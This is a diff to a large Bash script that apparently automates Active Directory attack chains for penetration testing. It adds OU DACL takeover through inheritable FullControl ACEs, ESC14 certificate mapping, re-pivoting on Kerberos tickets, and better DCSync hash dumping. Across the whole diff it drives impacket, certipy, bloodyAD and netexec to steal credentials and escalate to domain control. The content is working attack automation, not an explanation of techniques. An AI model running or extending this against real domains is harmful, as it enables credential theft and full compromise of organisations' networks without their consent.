@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.51.3"
+readonly VERSION="1.52.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -194,6 +194,7 @@ CERTIPY_TO=120      # hard timeout (s) on every certipy call — it loves to han
 declare -a FOUND_USERS=()
 declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
 declare -A SEEN_CREDS=()          # already-assessed users (avoid loops)
+declare -A TICKET_CREDS=()        # identity (lc) → reusable ccache from PKINIT/cert pivots
 declare -A FOUND_SECRETS=()       # every plaintext password we recover (for spraying)
 declare -A SPRAYED=()             # password→done, so we don't spray twice
 # Cross-iteration memo: the pivot loop re-runs every phase for each new identity,
@@ -208,12 +209,15 @@ declare -A ASSESS_N=()            # identity (lc) → times assessed; hard loop 
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
+declare -A OU_DESCENDANT_DONE=()   # "actor|ou-dn" → inheritable descendant takeover attempted
+declare -A ALTSECID_DONE=()        # "actor|target" → explicit certificate mapping attempted
 declare -A COMP_SILVER_DONE=()    # computer (lc) → takeover-via-silver-ticket already attempted
 declare -A ADIDNS_DONE=()         # ADIDNS records already attempted/created in this run
 declare -A BADSUCCESSOR_DONE=()   # OU (lc) → BadSuccessor (dMSA succession) already attempted
 BADSUCCESSOR_FAC_USER=""          # an owned identity that can MINT dMSAs (BadSuccessor "factory")
 BADSUCCESSOR_FAC_OU=""            # OU DN that identity can create dMSA children in
 BADSUCCESSOR_FAC_CC=""            # that identity's Kerberos ccache (needed for the S4U2self pull)
+ADCS_REUSABLE_PFX=""               # latest issued client-auth PFX usable for ESC14 mapping
 declare -A SHARE_DROP_DONE=()     # "user:share" → writable-share payload drop already handled
 declare -A MEM_DUMP_DONE=()       # "share/path" → memory/disk-image backup already hashdumped
 SHADOWCRED_NOCA=0                 # set once PKINIT proves the domain has no CA → skip further Shadow Creds
@@ -432,7 +436,33 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
         [[ "$qk" == "$key" ]] && return
     done
     CRED_QUEUE+=("${u}|${p}|${h}")
-    loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
+    local material="NT hash"
+    [[ -n "$p" ]] && material="password"
+    [[ -z "$p$h" && -n "${TICKET_CREDS[${u,,}]:-}" ]] && material="Kerberos ticket"
+    loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET} (${material})"
+}
+
+# Re-assess an identity whose usable password/hash is already in the engine. This is
+# needed when a LATER ACL change unlocks a new path for an EARLIER identity (for
+# example: GenericAll on an OU → inheritable control over a previously-owned child →
+# that child can now satisfy ESC9/ESC10 prerequisites). The lookup is entirely from
+# runtime state; no usernames, OUs or templates are hard-coded.
+_requeue_known_identity() {  # <samAccountName> <via>
+    local wanted="${1,,}" via="${2:-newly inherited ACL}" k ku kp kh
+    [[ -z "$wanted" || "$wanted" == "${USER,,}" ]] && return 1
+    if [[ -f "${TICKET_CREDS[$wanted]:-}" ]]; then
+        unset "SEEN_CREDS[${wanted}||]"
+        queue_cred "$1" "" "" "$via"
+        return 0
+    fi
+    for k in "${!SEEN_CREDS[@]}"; do
+        IFS='|' read -r ku kp kh <<<"$k"
+        [[ "${ku,,}" == "$wanted" && -n "$kp$kh" ]] || continue
+        unset "SEEN_CREDS[$k]"
+        queue_cred "$ku" "$kp" "$kh" "$via"
+        return 0
+    done
+    return 1
 }
 
 # True (0) when we ALREADY hold a usable credential for <user> — owned/assessed,
@@ -443,6 +473,7 @@ _have_creds_for() {
     local u="${1,,}"; [[ -z "$u" ]] && return 1
     u="${u%\$}"                                   # normalize trailing $ (machine accts)
     [[ -n "${OWNED_GROUPS[$u]:-}" ]] && return 0  # already compromised/assessed
+    [[ -f "${TICKET_CREDS[$u]:-}" ]] && return 0
     [[ -n "$OUTDIR" && -s "$OUTDIR/recovered_hashes.txt" ]] && \
         grep -qiE "^${u//./\\.}(\\\$)?[[:space:]]" "$OUTDIR/recovered_hashes.txt" && return 0
     local q qu qp qh ql
@@ -533,7 +564,7 @@ note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_
 check_deps() {
     section "DEPENDENCY CHECK"
     local req=(nmap smbclient rpcclient ldapsearch ntpdate)
-    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT impacket-findDelegation certipy bloodhound-python enum4linux-ng smbmap john hashcat)
+    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT impacket-findDelegation dacledit.py certipy openssl bloodhound-python enum4linux-ng smbmap john hashcat)
     local missing=0
 
     if [[ -z "$NXC" ]]; then err "netexec/nxc NOT found (required)"; missing=1; else ok "netexec/nxc -> $NXC"; fi
@@ -1145,10 +1176,19 @@ phase_validate_creds() {
     [[ -z "$USER" ]] && return
     section "PHASE 4 · KERBEROS TGT + CREDENTIAL VALIDATION"
 
+    # Certificate authentication can yield only a TGT (not an NT hash), notably
+    # for Protected Users. Treat that ccache as first-class pivot material instead
+    # of requiring a password/hash and stopping the chain at "TGT cached".
+    if [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" && -f "$KERB_TICKET" ]]; then
+        export KRB5CCNAME="$KERB_TICKET"; HAVE_AUTH=1
+        loot "Reusing certificate-issued Kerberos ticket → KRB5CCNAME=$KERB_TICKET"
+        note_cred_source "$USER" "authenticated (certificate-issued TGT)"
+    fi
+
     # --- Step 1: request the TGT FIRST. getTGT talks to -dc-ip directly, so it
     # works even before DNS/hosts is sorted, and a successful TGT is definitive
     # proof the credentials are valid. ---
-    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]] \
+    if [[ "$HAVE_AUTH" != "1" && "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]] \
        && { [[ -n "$PASS" ]] || [[ -n "$HASH" ]]; }; then
         # NOTE: skipped when the password is EMPTY (blank-password accounts) — getTGT
         # can't take an empty password on the CLI, it would drop to an interactive
@@ -1935,12 +1975,12 @@ if shown == 0:
 PY
 }
 
-ADCS_PWNED=0       # set once an ESC yields Administrator → stop re-issuing certs
+ADCS_PWNED=0       # set once an ESC yields a usable escalation pivot → stop duplicate issuance
 phase_adcs() {
     [[ "$HAVE_AUTH" != "1" ]] && return
     section "PHASE 7 · ADCS — VULNERABLE CERTIFICATE TEMPLATES (Certipy)"
     have certipy || { warn "certipy unavailable, skipping"; return; }
-    [[ "$ADCS_PWNED" == "1" ]] && { info "Already escalated to Administrator via ADCS — skipping"; return; }
+    [[ "$ADCS_PWNED" == "1" ]] && { info "An ADCS escalation already succeeded in this run — skipping duplicate issuance"; return; }
 
     # IMPORTANT: `certipy find -vulnerable` flags a template as abusable only if THE
     # CURRENT USER can enrol in it — so abusability is PER-IDENTITY, not domain-wide.
@@ -1977,7 +2017,8 @@ phase_adcs() {
         loot "★★★ ${USER} can abuse ADCS: $escs ★★★"
         grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' <<<"$cout" | sed 's/^/      /'
         # structured dump for analysis (best-effort)
-        "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy_$(_safe_name "$USER")" >/dev/null 2>&1
+        ( cd "$OUTDIR" && "${cenv[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find \
+            "${cbase[@]}" "${cauth[@]}" -output "certipy_$(_safe_name "$USER")" >/dev/null 2>&1 )
         _abuse_adcs "$cout" && ADCS_PWNED=1
     elif [[ "$DEEP_CVE" == "1" ]]; then
         # OPT-IN only (--deep-cve): the full review runs a SECOND certipy enumeration
@@ -2024,7 +2065,9 @@ phase_adcs() {
 # ===========================================================================
 _bh_latest_zip() { ls -t "$OUTDIR"/bloodhound/*_bloodhound.zip "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1; }
 
-# env: BHZIP=<zip> OWNER=<sAMAccountName> → prints "RightName<TAB>targetSAM<TAB>targetType"
+# env: BHZIP=<zip> OWNER=<sAMAccountName> → prints
+# "RightName<TAB>targetSAM<TAB>targetType<TAB>targetDN". The DN is essential for
+# container/OU abuse because those objects have no sAMAccountName.
 _bh_outbound_edges_py() {
 python3 - <<'PYEOF'
 import os, sys, json, zipfile
@@ -2048,7 +2091,8 @@ for fn,doc in data.items():
         oid=o.get("ObjectIdentifier") or ""
         props=o.get("Properties") or {}
         sam=short(props.get("samaccountname") or props.get("name") or oid)
-        objs.append((sam,typ,o.get("Aces") or []))
+        dn=props.get("distinguishedname") or ""
+        objs.append((sam,typ,dn,o.get("Aces") or []))
         if typ=="Group":
             groups.append((oid,[m.get("ObjectIdentifier","") for m in (o.get("Members") or [])]))
         if owner in (sam.lower(), short(props.get("name","")).lower()):
@@ -2078,13 +2122,13 @@ ABUSABLE={"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","AddMember
           "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink","WriteSPN","AddAllowedToAct",
           "ReadGMSAPassword","ReadLAPSPassword"}
 seen=set()
-for sam,typ,aces in objs:
+for sam,typ,dn,aces in objs:
     for a in aces:
         r=a.get("RightName")
         if a.get("PrincipalSID","") in mysids and r in ABUSABLE:
             k=(r,sam,typ)
             if k in seen: continue
-            seen.add(k); print("%s\t%s\t%s"%(r,sam,typ))
+            seen.add(k); print("%s\t%s\t%s\t%s"%(r,sam,typ,dn))
 PYEOF
 }
 
@@ -2095,8 +2139,8 @@ phase_bh_abuse() {
     [[ -z "$edges" ]] && return
     section "BLOODHOUND-DRIVEN ABUSE · ${USER}'s outbound rights (graph parity)"
     [[ "$DO_ABUSE" != "1" ]] && info "  (report-only; --abuse to act on these BloodHound edges)"
-    local right tgt cls dk
-    while IFS=$'\t' read -r right tgt cls; do
+    local right tgt cls dn dk
+    while IFS=$'\t' read -r right tgt cls dn; do
         [[ -z "$right" || -z "$tgt" ]] && continue
         dk="${tgt,,}:${right,,}"
         [[ -n "${ABUSED_GLOBAL[$dk]:-}" ]] && continue   # already handled (here or in the ACL phase)
@@ -2114,23 +2158,30 @@ phase_bh_abuse() {
                 case "$cls" in
                     Group)    _abuse_group "$tgt" ;;
                     Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
-                    OU)       loot "GenericWrite over OU '$tgt' → restore handled in the lifecycle phase if deleted children are writable" ;;
+                    OU)       warn "GenericWrite over OU '$tgt' does not by itself grant WriteDACL; descendant takeover needs GenericAll/WriteDACL" ;;
                     *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
                               else _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"; fi ;;
                 esac ;;
-            GenericAll|AllExtendedRights)
+            GenericAll)
                 case "$cls" in
                     Group)    _abuse_group "$tgt" ;;
                     Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
-                    OU)       loot "GenericAll over OU '$tgt' → restore handled in the lifecycle phase" ;;
+                    OU)       _abuse_ou_descendants "${dn:-$tgt}" "$right" ;;
                     *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
                               else _abuse_user_smart "$tgt"; fi ;;
+                esac ;;
+            AllExtendedRights)
+                case "$cls" in
+                    Group)    _abuse_group "$tgt" ;;
+                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" ;;
+                    OU)       warn "AllExtendedRights over OU '$tgt' does not include WriteDACL; cannot install an inheritable descendant ACE" ;;
+                    *)        _abuse_user_smart "$tgt" ;;
                 esac ;;
             WriteDacl|WriteOwner|Owns)
                 case "$cls" in
                     Group)    _abuse_group "$tgt" ;;
                     Computer) _abuse_acl_takeover "$tgt" || _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
-                    OU)       loot "${right} over OU '$tgt' → restore handled in the lifecycle phase" ;;
+                    OU)       _abuse_ou_descendants "${dn:-$tgt}" "$right" ;;
                     *)        _abuse_acl_takeover "$tgt" ;;
                 esac ;;
         esac
@@ -2166,8 +2217,12 @@ phase_dcsync() {
     subsection "Attempting DCSync (requires DA / replication rights)"
     info "If this fails, the current account lacks the privileges — that's expected."
     if [[ -n "$KERB_TICKET" ]]; then
-        run "KRB5CCNAME=$KERB_TICKET impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
-        KRB5CCNAME="$KERB_TICKET" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
+        # Impacket needs the authenticated principal as well as the target. Passing
+        # only the DC hostname makes some versions derive an empty/invalid domain DN
+        # and return ERROR_DS_DRA_BAD_DN even when the ticket has replication rights.
+        local ktarget="$(imp_principal)@${DC_FQDN:-$DC_IP}"
+        run "KRB5CCNAME=$KERB_TICKET impacket-secretsdump -k -no-pass $ktarget -just-dc"
+        KRB5CCNAME="$KERB_TICKET" impacket-secretsdump -k -no-pass "$ktarget" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
     elif [[ -n "$HASH" ]]; then
         run "impacket-secretsdump $(imp_principal)@$DC_IP -hashes :$HASH -just-dc"
         impacket-secretsdump "$(imp_principal)@$DC_IP" -hashes ":$HASH" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
@@ -2181,7 +2236,9 @@ phase_dcsync() {
         ok "$(grep -cE ':::' "$outf") NTLM hashes dumped:"
         grep -E ':::' "$outf" | while read -r line; do
             local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
-            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
+            # printf prints DOMAIN\user literally; echo -e would turn account
+            # prefixes such as \a or \e into terminal control characters.
+            printf '      %s%s%s%s : %s%s%s\n' "$C_RED" "$C_BOLD" "$u" "$C_RESET" "$C_MAGENTA" "$nt" "$C_RESET"
         done
         grep -iE '^administrator:' "$outf" | head -1 | while read -r l; do
             loot "ADMINISTRATOR HASH: $(echo "$l" | cut -d: -f4)"
@@ -2194,8 +2251,12 @@ phase_dcsync() {
             grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
             crack_hashes "$OUTDIR/ntlm_hashes.txt" 1000 "NTLM"
         fi
-    else
+    elif grep -qiE 'ERROR_DS_DRA_BAD_DN|distinguished name specified.*invalid' "$outf" 2>/dev/null; then
+        warn "DCSync reached DRSUAPI but the replication DN/target was rejected (BAD_DN) — this is not proof that the account lacks replication rights"
+    elif grep -qiE 'rpc_s_access_denied|ERROR_DS_DRA_ACCESS_DENIED|access.*denied|INSUFF_ACCESS|not authorized' "$outf" 2>/dev/null; then
         warn "DCSync not authorized with these credentials (not DA / no replication rights)"
+    else
+        warn "DCSync did not return domain hashes (see secretsdump.txt for the transport/protocol error)"
     fi
 }
 
@@ -3517,7 +3578,9 @@ phase_acl() {
         [[ -z "$cur_name" ]] && continue
         local ll="${line,,}" act=""
         if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
-        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
+        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* \
+                && ( "$cur_class" == "computer" || "$cur_sam" == *\$ ) ]]; then act="rbcd"
+        elif [[ "$ll" == *altsecurityidentities* && "$ll" == *write* ]]; then act="altsecid"
         elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
         # BadSuccessor: the right to create a msDS-DelegatedManagedServiceAccount
         # (dMSA) child under an OU/container is a full domain-takeover primitive on
@@ -3529,7 +3592,8 @@ phase_acl() {
         # (often surfaced under a GenericWrite) → BadSuccessor "marker" side. Pair
         # with a registered dMSA factory to read the victim's hash with no reset.
         elif [[ "$ll" == *supersededmanagedaccountlink* || "$ll" == *supersededserviceaccountstate* ]]; then act="bsmark"
-        elif [[ "$cur_class" == "dns" && ( "$ll" == *create_child* || "$ll" == *writeproperty* || "$ll" == *genericall* ) ]]; then act="dns"
+        elif [[ "$cur_class" == "dns" \
+                && "$ll" =~ (create_child|writeproperty|genericall|fullcontrol|writedacl|owner) ]]; then act="dns"
         # Any right that lets us write a GROUP's membership → add ourselves. This
         # must catch AddSelf (Self-Membership) and AddMember too, which bloodyAD
         # surfaces as 'member'/'self', NOT as GenericAll — so keying only on
@@ -3548,6 +3612,8 @@ phase_acl() {
         case "$act" in
             shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$tgt" ;;
             rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$tgt" ;;
+            altsecid) warn "Writable altSecurityIdentities on ${C_BOLD}$cur_name${C_RESET} → ESC14 explicit certificate mapping"
+                      _abuse_altsecid "$tgt" "$cur_dn" ;;
             spn)    _abuse_writespn "$tgt" ;;
             dns)    warn "Writable DNS zone (${C_BOLD}${cur_name}${C_RESET}) → ${C_BOLD}ADIDNS${C_RESET} record injection (BloodHound usually misses this one)"
                     _abuse_adidns "$cur_name" ;;
@@ -3560,8 +3626,8 @@ phase_acl() {
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                 if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
                 elif [[ "$cur_class" == "ou" || "$cur_dn" =~ ^[Oo][Uu]= ]]; then
-                    loot "GenericAll over OU '${cur_name}' → can restore & reset its (deleted) child objects"
-                    info "  → handled in the Account Lifecycle phase (AD Recycle Bin restore → password reset → pivot)"
+                    loot "Writable DACL over OU '${cur_name}' → installing an inheritable ACE and pivoting through live descendants"
+                    _abuse_ou_descendants "$cur_dn" "GenericAll/WriteDACL"
                 elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
                 elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
                 else _abuse_user_smart "$tgt"; fi ;;
@@ -3898,6 +3964,140 @@ _abuse_user() {
 # a success string (which silently broke the takeover when bloodyAD changed wording).
 _bloody_failed() {
     grep -qiE 'Traceback|Exception|insufficientAccess|INSUFF_ACCESS|ERROR_DS|not allowed|could not|no such object|invalidCredentials|operation.*fail|^\[-\]|[[:space:]]denied' <<<"$1"
+}
+
+# Build impacket-dacledit authentication from the CURRENT runtime credential.
+# Password/hash auth is preferred so the write and its rollback do not depend on
+# a ccache surviving a later pivot; Kerberos remains available for ticket-only
+# identities. Arrays keep metacharacters in passwords, DNs and usernames intact.
+_DACL_AUTH=(); _DACL_ENV=()
+_dacl_setauth() {
+    _DACL_AUTH=(); _DACL_ENV=()
+    if [[ -n "$PASS" ]]; then
+        _DACL_ENV=(env -u KRB5CCNAME)
+        _DACL_AUTH=("${DOMAIN}/${USER}:${PASS}" -dc-ip "$DC_IP")
+    elif [[ -n "$HASH" ]]; then
+        _DACL_ENV=(env -u KRB5CCNAME)
+        _DACL_AUTH=("${DOMAIN}/${USER}" -hashes ":${HASH##*:}" -dc-ip "$DC_IP")
+    elif [[ -n "$KERB_TICKET" ]]; then
+        _DACL_ENV=(env "KRB5CCNAME=$KERB_TICKET")
+        _DACL_AUTH=("${DOMAIN}/${USER}" -k -no-pass -dc-ip "$DC_IP")
+    else
+        return 1
+    fi
+    [[ -n "$DC_FQDN" ]] && _DACL_AUTH+=(-dc-host "$DC_FQDN")
+}
+
+# GenericAll/WriteDACL on an OU controls the CONTAINER, not automatically the
+# existing children in a way useful to the pivot engine. Install a FullControl
+# ACE with OBJECT+CONTAINER inheritance, enumerate live descendants dynamically,
+# and give each descendant a self-ACE. A credential learned earlier can then be
+# re-assessed after its permissions changed (the d.baker→a.carter→d.baker shape,
+# without embedding any of those names). Unknown descendants still feed the usual
+# ShadowCred/RBCD/reset handlers. adminCount=1 objects are skipped because SDProp
+# blocks/overwrites normal OU inheritance.
+_abuse_ou_descendants() {               # <OU distinguishedName> <source right>
+    local ou_dn="$1" source_right="${2:-GenericAll}" key="${USER,,}|${1,,}"
+    [[ -z "$ou_dn" ]] && return 1
+    [[ -n "${OU_DESCENDANT_DONE[$key]:-}" ]] && { info "  OU descendant takeover already completed for '$ou_dn' as $USER"; return 0; }
+    if [[ "$DO_ABUSE" != "1" ]]; then
+        info "  (report-only; --abuse installs an inheritable FullControl ACE on '$ou_dn' and pivots through its live descendants)"
+        return 1
+    fi
+    have dacledit.py || { warn "  dacledit.py unavailable — cannot write an inheritable OU ACE"; return 1; }
+    have bloodyAD || return 1
+    _dacl_setauth || { warn "  no reusable authentication material for OU DACL takeover"; return 1; }
+
+    local ba; mapfile -t ba < <(bloody_args)
+    local children
+    children=$(bloodyAD "${ba[@]}" get search --base "$ou_dn" \
+        --filter '(|(objectClass=user)(objectClass=computer))' \
+        --attr distinguishedName,sAMAccountName,objectClass,adminCount 2>&1)
+    if _bloody_failed "$children"; then
+        warn "  could not enumerate live users/computers below OU '$ou_dn'"
+        printf '%s\n' "$children" >>"$LOGFILE"
+        return 1
+    fi
+    local child_rows
+    child_rows=$(awk 'BEGIN{RS=""; FS="\n"; OFS="\t"}
+        {dn=""; sam=""; cls=""; adm="0"
+         for(i=1;i<=NF;i++) {
+           if($i ~ /^distinguishedName:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); dn=x}
+           else if($i ~ /^sAMAccountName:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); sam=x}
+           else if($i ~ /^objectClass:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); cls=cls " " x}
+           else if($i ~ /^adminCount:[[:space:]]*/) {x=$i; sub(/^[^:]+:[[:space:]]*/,"",x); adm=x}
+         }
+         if(dn!="" && sam!="") print sam,dn,cls,adm}' <<<"$children")
+    [[ -z "$child_rows" ]] && { info "  no live user/computer descendants under '$ou_dn'"; return 1; }
+
+    abuse_confirm "  Use ${source_right} on OU '$ou_dn' to install an inheritable FullControl ACE and pivot through its descendants?" || return 1
+    local backup="$OUTDIR/dacl_ou_$(_safe_name "$ou_dn")_${RANDOM}.bak" dacl_out rc
+    run "dacledit.py <current-auth> -action write -rights FullControl -inheritance -principal '$USER' -target-dn '$ou_dn'"
+    dacl_out=$("${_DACL_ENV[@]}" dacledit.py "${_DACL_AUTH[@]}" -action write -rights FullControl \
+        -inheritance -principal "$USER" -target-dn "$ou_dn" -file "$backup" 2>&1); rc=$?
+    printf '%s\n' "$dacl_out" | tee -a "$LOGFILE"
+
+    # WriteOwner/Owns is one step short of WriteDACL: take ownership only when the
+    # direct write proved insufficient, then retry the same generic procedure.
+    if (( rc != 0 )) || ! grep -qi 'DACL modified successfully' <<<"$dacl_out"; then
+        if [[ "${source_right,,}" == *owner* || "${source_right,,}" == *owns* ]]; then
+            local own_out
+            own_out=$(bloodyAD "${ba[@]}" set owner "$ou_dn" "$USER" 2>&1); printf '%s\n' "$own_out" >>"$LOGFILE"
+            if _bloody_failed "$own_out"; then warn "  could not take ownership of OU '$ou_dn'"; return 1; fi
+            rb_record "Set owner of OU $ou_dn to $USER" "echo 'Manual: restore the original OU owner'"
+            backup="$OUTDIR/dacl_ou_$(_safe_name "$ou_dn")_${RANDOM}.bak"
+            dacl_out=$("${_DACL_ENV[@]}" dacledit.py "${_DACL_AUTH[@]}" -action write -rights FullControl \
+                -inheritance -principal "$USER" -target-dn "$ou_dn" -file "$backup" 2>&1); rc=$?
+            printf '%s\n' "$dacl_out" | tee -a "$LOGFILE"
+        fi
+    fi
+    if (( rc != 0 )) || ! grep -qi 'DACL modified successfully' <<<"$dacl_out"; then
+        warn "  failed to install the inheritable ACE on OU '$ou_dn'"
+        return 1
+    fi
+
+    OU_DESCENDANT_DONE["$key"]=1
+    local restore_cmd; printf -v restore_cmd '%q ' "${_DACL_ENV[@]}" dacledit.py "${_DACL_AUTH[@]}" -action restore -file "$backup"
+    rb_record "Installed inheritable FullControl for $USER on OU $ou_dn" "$restore_cmd"
+    loot "★ Inheritable FullControl installed on '$ou_dn' — enumerating live descendants"
+
+    local sam child_dn classes admin_count kind grant_out grant_rc attempt changed=0 child_undo
+    while IFS=$'\t' read -r sam child_dn classes admin_count; do
+        [[ -z "$sam" || "${sam,,}" == "${USER,,}" ]] && continue
+        if [[ "$admin_count" == "1" ]]; then
+            info "  skipping protected descendant '$sam' (adminCount=1 / SDProp)"
+            continue
+        fi
+        kind="user"; grep -qi 'computer' <<<"$classes" && kind="computer"
+        grant_out=""
+        for attempt in 1 2 3; do
+            grant_out=$(bloodyAD "${ba[@]}" add genericAll "$child_dn" "$sam" 2>&1); grant_rc=$?
+            printf '%s\n' "$grant_out" >>"$LOGFILE"
+            { (( grant_rc == 0 )) && ! _bloody_failed "$grant_out"; } && break
+            (( attempt < 3 )) && sleep 2
+        done
+        if (( grant_rc != 0 )) || _bloody_failed "$grant_out"; then
+            warn "  inherited ACL did not propagate to '$sam' after 3 attempts"
+            continue
+        fi
+        ((changed++))
+        loot "  ↳ '$sam' now controls its own object (inherited OU takeover)"
+        printf -v child_undo '%q ' bloodyAD "${ba[@]}" remove genericAll "$child_dn" "$sam"
+        rb_record "Granted $sam self-GenericAll on $child_dn" "$child_undo"
+
+        # The important loop-back: permissions may unlock a path for a credential
+        # that was assessed BEFORE this OU edge was found. Otherwise acquire the
+        # descendant through the normal object-type-specific handlers.
+        if _requeue_known_identity "$sam" "OU inherited FullControl from $USER"; then
+            loot "  ↳ re-queued known credential '$sam' after its ACL changed"
+        elif [[ "$kind" == "computer" ]]; then
+            _abuse_rbcd "$sam" || _abuse_shadowcred "$sam"
+        else
+            _abuse_user_smart "$sam"
+        fi
+    done <<<"$child_rows"
+    (( changed > 0 )) || { warn "  OU ACE was written, but no eligible descendant could be activated"; return 1; }
+    return 0
 }
 
 _abuse_acl_takeover() {
@@ -4292,18 +4492,87 @@ _adcs_admin_sid() {                     # domain Administrator (RID 500) SID, be
     sid=$(bloodyAD "${ba[@]}" get object "$USER" --attr objectSid 2>/dev/null | grep -oiP 'S-1-5-21-[0-9-]+' | head -1)
     [[ -n "$sid" ]] && echo "${sid%-*}-500"
 }
+
+# Isolate one certipy template stanza. Weak certificate mapping depends on the
+# template's actual subject-name flags; treating every ESC9/10/16 as an ESC1 SAN
+# request fails whenever Enrollee-Supplies-Subject is disabled.
+_adcs_template_block() {                # <certipy-find-output> <template>
+    awk -v want="$2" '
+        /Template Name[[:space:]]*:/ {
+            name=$0; sub(/^.*Template Name[[:space:]]*:[[:space:]]*/,"",name)
+            if(active && tolower(name)!=tolower(want)) exit
+            active=(tolower(name)==tolower(want))
+        }
+        active {print}' <<<"$1"
+}
+
+_adcs_attr_value() {                    # <LDAP output> <attribute>
+    awk -v key="$2" 'tolower(substr($0,1,length(key)+1))==tolower(key ":") {
+        x=$0; sub(/^[^:]+:[[:space:]]*/,"",x); print x; exit}' <<<"$1"
+}
+
+# Restore temporary weak-mapping attributes in reverse order. Namerefs keep all
+# argv elements quoted and allow the caller to use either simple-bind or ccache
+# auth. A failed restore is written to the standard rollback file with an exact,
+# shell-escaped command instead of being silently ignored.
+_adcs_restore_attrs() {                 # target auth[] env[] attrs[] old[] had[]
+    local target="$1"; shift
+    local -n _rauth="$1" _renv="$2" _rattrs="$3" _rold="$4" _rhad="$5"
+    local i out rc failed=0 undo
+    for ((i=${#_rattrs[@]}-1; i>=0; i--)); do
+        if [[ "${_rhad[$i]}" == "1" ]]; then
+            out=$("${_renv[@]}" bloodyAD "${_rauth[@]}" set object "$target" "${_rattrs[$i]}" -v "${_rold[$i]}" 2>&1); rc=$?
+        else
+            out=$("${_renv[@]}" bloodyAD "${_rauth[@]}" set object "$target" "${_rattrs[$i]}" 2>&1); rc=$?
+        fi
+        printf '%s\n' "$out" >>"$LOGFILE"
+        if (( rc != 0 )) || _bloody_failed "$out"; then
+            ((failed++))
+            if [[ "${_rhad[$i]}" == "1" ]]; then
+                printf -v undo '%q ' "${_renv[@]}" bloodyAD "${_rauth[@]}" set object "$target" "${_rattrs[$i]}" -v "${_rold[$i]}"
+            else
+                printf -v undo '%q ' "${_renv[@]}" bloodyAD "${_rauth[@]}" set object "$target" "${_rattrs[$i]}"
+            fi
+            rb_record "Restore $target ${_rattrs[$i]} after ADCS weak mapping" "$undo"
+            warn "  could not restore ${target}'s ${_rattrs[$i]} automatically (tracked in rollback file)"
+        else
+            ok "Restored ${target}'s ${_rattrs[$i]}"
+        fi
+    done
+    (( failed == 0 ))
+}
+
 # certipy auth a PFX → recover the principal's NT hash (or TGT) and pivot on it.
 # `</dev/null` stops certipy's interactive "save private key? (y/N)" prompt from
 # hanging. selfok=1 (ESC13) accepts authenticating as ourselves (we gain a group);
